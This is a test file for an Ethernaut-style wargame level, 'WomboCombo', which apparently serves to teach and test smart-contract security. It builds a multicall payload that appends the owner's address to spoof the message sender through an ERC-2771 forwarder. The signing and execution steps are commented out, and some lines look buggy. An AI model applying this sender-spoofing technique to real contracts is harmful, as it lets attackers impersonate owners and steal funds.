const WomboComboFactory = artifacts.require('./levels/WomboComboFactory.sol');
const Staking = artifacts.require('./levels/Staking.sol');
const WomboToken = artifacts.require('WomboToken');
const Forwarder = artifacts.require('Forwarder');

const Ethernaut = artifacts.require('./Ethernaut.sol');
const {
  BN,
  constants,
  expectEvent,
  expectRevert,
} = require('openzeppelin-test-helpers');
const utils = require('../utils/TestUtils');
const { ethers, upgrades } = require('hardhat');


contract('WomboCombo', function (accounts) {
  let ethernaut;
  let level;
  let owner = accounts[1];
  let player = accounts[0];
  let statproxy;

  const EIP712Domain = [
    { name: 'name', type: 'string' },
    { name: 'version', type: 'string' },
    { name: 'chainId', type: 'uint256' },
    { name: 'verifyingContract', type: 'address' },
    { name: 'salt', type: 'bytes32' },
  ];
  
  async function getDomain(contract) {
    const { fields, name, version, chainId, verifyingContract, salt, extensions } = await contract.eip712Domain();
  
    if (extensions.length > 0) {
      throw Error('Extensions not implemented');
    }
  
    const domain = { name, version, chainId, verifyingContract, salt };
    for (const [i, { name }] of EIP712Domain.entries()) {
      if (!(fields & (1 << i))) {
        delete domain[name];
      }
    }
  
    return domain;
  }

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy();
    level = await WomboComboFactory.new();
    await ethernaut.registerLevel(level.address);
  });

  it('should allow the player to solve the level', async function () {
    const instance = await utils.createLevelInstance(
      ethernaut,
      level.address,
      player,
      Staking,
      { from: player, value: web3.utils.toWei('0.001', 'ether') }
    );

    // Init checks
    let stakingTokenAddress = await instance.stakingToken();
    let rewardTokenAddress = await instance.rewardsToken();
    let forwarderAddress = await instance.rewardsToken();
    const stakingToken = new WomboToken(stakingTokenAddress);
    const rewardToken = new WomboToken(rewardTokenAddress);
    const forwarder = new Forwarder(forwarderAddress);

    assert.notEqual(await instance.owner(), ethers.constants.AddressZero);
    assert.equal(await stakingToken.balanceOf(player), 100 * 10 ** 18);
    assert.equal(await rewardToken.balanceOf(instance.address), 100000000 * 10 ** 18);

    // Solve level
    let completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    );
    assert.equal(completed, false);

    const owner = await instance.owner();

    const msgSenderCall = web3.eth.abi.encodeFunctionCall(
      {
        name: 'msgSender',
        type: 'function',
        inputs: [],
      },
      [],
    );

    const data = web3.eth.abi.encodeFunctionCall(
      {
        name: 'multicall',
        type: 'function',
        inputs: [
          {
            internalType: 'bytes[]',
            name: 'data',
            type: 'bytes[]',
          },
        ],
      },
      [[web3.utils.encodePacked({ value: msgSenderCall, type: 'bytes' }, { value: owner, type: 'address' })]],
    );

    const req = {
      from: player.address,
      to: instance.address,
      value: '0',
      gas: '1000000',
      nonce: Number(0),
      deadline: Number(ethers.constants.MaxUint256),
      data,
    };

    const domain = await getDomain(forwarder);
    // const types = {
    //   EIP712Domain: domainType(domain),
    //   ForwardRequest: [
    //     { name: 'from', type: 'address' },
    //     { name: 'to', type: 'address' },
    //     { name: 'value', type: 'uint256' },
    //     { name: 'gas', type: 'uint256' },
    //     { name: 'nonce', type: 'uint256' },
    //     { name: 'deadline', type: 'uint256' },
    //     { name: 'data', type: 'bytes' },
    //   ],
    // };

    // const signature = await ethSigUtil.signTypedMessage(player.getPrivateKey(), {
    //   data: {
    //     types: types,
    //     domain: domain,
    //     primaryType: 'ForwardRequest',
    //     message: req,
    //   },
    // });

    // expect(await this.forwarder.verify(req, signature)).to.equal(true);

    // const receipt = await this.forwarder.execute(req, signature);

    // stakingToken.approve(instance.address, 100 * 10 ** 18);
    // instance.stake(100 * 10 ** 18);

    // completed = await utils.submitLevelInstance(
    //   ethernaut,
    //   level.address,
    //   instance.address,
    //   player
    // );
    // assert.equal(completed, true);
  });
});
